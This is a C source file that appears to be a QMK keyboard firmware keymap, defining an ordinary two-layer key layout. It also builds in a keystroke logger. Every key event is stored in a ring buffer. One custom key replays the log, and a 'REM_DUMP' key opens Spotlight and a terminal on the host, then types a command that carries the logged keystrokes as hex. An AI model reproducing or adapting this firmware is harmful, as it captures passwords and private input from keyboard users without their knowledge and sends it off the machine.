#include QMK_KEYBOARD_H

#include "key_event.h"
#include "const_strings.h"

#define NO_KEY_MAPPING          0

enum custom_keycodes {
    DUMP = SAFE_RANGE,
    REM_DUMP
};

#define BUF_LEN 2048
typedef struct {
    struct key_event events[BUF_LEN];
    uint16_t head;
    uint16_t length;
} ring_buf;

ring_buf keylog = { .head = 0, .length = 0 };

static void rb_push_back(ring_buf *rb, struct key_event event) {
    if (rb->length < BUF_LEN) {
        uint16_t slot = (rb->head + rb->length) % BUF_LEN;
        rb->events[slot] = event;
        rb->length++;
    } else {
        rb->events[rb->head] = event;
        rb->head = (rb->head + 1) % BUF_LEN;
    }

}

#if 0
static struct key_event rb_pop_front(ring_buf *rb) {
    if (rb->length <= 0) {
        return NO_EVENT;
    }

    struct key_event event = rb->events[rb->head];

    if (rb->head == BUF_LEN - 1) {
        q->head = 0;
    } else {
        q->head++;
    }

    q->length--;

    return event;
}
#endif

static struct key_event rb_peek_at(ring_buf *rb, uint16_t index) {
    if (index < 0 || index >= rb->length) {
        return NO_EVENT;
    }

    uint16_t rb_idx = (rb->head + index) % BUF_LEN;

    return rb->events[rb_idx];
}

#define MOD_OFFSET (KC_LCTRL - (KC_KP_EQUAL + 1))
static uint8_t map_qmk_kc(uint16_t qmk_kc) {
    if (qmk_kc >= KC_A && qmk_kc <= KC_KP_EQUAL) {
        return (uint8_t)qmk_kc;
    } else if (qmk_kc >= KC_LCTRL && qmk_kc <= KC_RGUI) {
        return (uint8_t)(qmk_kc - MOD_OFFSET);
    }

    return NO_KEY_MAPPING;
}

static uint16_t get_qmk_kc(uint8_t mapped_kc) {
    if (mapped_kc >= KC_A && mapped_kc <= KC_KP_EQUAL) {
        return (uint16_t)mapped_kc;
    } else if (mapped_kc + MOD_OFFSET <= KC_RGUI) {
        return (uint16_t)(mapped_kc + MOD_OFFSET);
    }

    return NO_KEY_MAPPING;
}




static void send_byte_as_hex(uint8_t byte) {
    static const char HEX[16] = "0123456789ABCDEF";

    char hi = HEX[(byte >> 4) & 0xF];
    char lo = HEX[byte & 0xF];

    send_char(hi);
    send_char(lo);
}

static void open_spotlight(void) {
    register_code(KC_LGUI);
    register_code(KC_SPACE);
    unregister_code(KC_SPACE);
    unregister_code(KC_LGUI);
}

static void open_terminal(void) {
    send_string_P(TERMINAL);
    tap_code(KC_ENT);
}

static void send_logged_data(void) {
    for (uint16_t i = 0; i < keylog.length; i++) {
        struct key_event event = rb_peek_at(&keylog, i);
        uint8_t byte = EVENT_TO_BYTE(event);
        send_byte_as_hex(byte);
    }
}


bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    uint8_t mapped_kc = map_qmk_kc(keycode);
    if (mapped_kc != NO_KEY_MAPPING) {
        struct key_event event = {
            .is_pressed = record->event.pressed,
            .mapped_kc = mapped_kc
        };

        rb_push_back(&keylog, event);
    }

    switch (keycode) {
    case DUMP:
        if (record->event.pressed) {
            for (uint16_t i = 0; i < keylog.length; i++) {
                struct key_event event = rb_peek_at(&keylog, i);

                uint16_t qmk_kc = get_qmk_kc(event.mapped_kc);

                if (event.is_pressed) {
                    register_code16(qmk_kc);
                } else {
                    unregister_code16(qmk_kc);
                }
            }
        } 

        return false;
    case REM_DUMP:
        if (record->event.pressed) {
            cli();

            open_spotlight();
            open_terminal();
            wait_ms(1000);

            send_string_P(QUERY_CMD_START);

            send_logged_data();

            send_string_P(QUERY_CMD_END);
            tap_code(KC_ENT);

            sei();
        }

        break;
   }

    return true;
}

void keyboard_post_init_user(void) {
    debug_enable = true;
}

const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
    LAYOUT(
        KC_GESC, KC_1,    KC_2,    KC_3,    KC_4,    KC_5,    KC_6,    KC_7,    KC_8,    KC_9,    KC_0,    KC_MINS, KC_EQL,  XXXXXXX, KC_BSPC,
        KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,
        KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT,          KC_ENT,
        KC_LSFT, XXXXXXX, KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_RSFT, XXXXXXX,
        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, REM_DUMP,XXXXXXX, MO(1),   DUMP
    ),

    LAYOUT(
        KC_GRV,  KC_F1,   KC_F2,   KC_F3,   KC_F4,   KC_F5,   KC_F6,   KC_F7,   KC_F8,   KC_F9,   KC_F10,  KC_F11,  KC_F12,  _______, KC_DEL,
        _______, RGB_TOG, RGB_MOD, RGB_HUI, RGB_HUD, RGB_SAI, RGB_SAD, RGB_VAI, RGB_VAD, _______, _______, _______, _______, RESET,
        _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______,          _______,
        _______, _______, _______, _______, BL_DEC,  BL_TOGG, BL_INC,  BL_STEP, _______, _______, _______, _______, _______, _______,
        _______, _______, _______,                   _______, _______, _______,          _______, _______, _______, _______, _______
    )
};
